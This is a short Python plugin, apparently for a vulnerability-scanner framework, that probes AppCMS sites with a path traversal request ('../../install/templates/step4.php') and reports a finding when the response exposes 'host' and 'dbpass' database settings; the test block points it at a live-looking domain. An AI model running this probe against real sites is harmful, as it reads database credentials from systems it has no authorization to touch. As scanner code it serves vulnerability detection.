#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2015-0139684


def assign(service, arg):
    if service == 'appcms':
        return True, arg

def audit(arg):            
    payload = 'index.php?tpl=../../install/templates/step4.php'
    url = arg + payload 
    code, head, res, errcode, _ = curl.curl2(url)
    if code == 200 and 'host' in res and 'dbpass' in res :
        security_warning(url + '   :Infromation Traversal')
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('appcms','http://gotoxy.cn/')[1])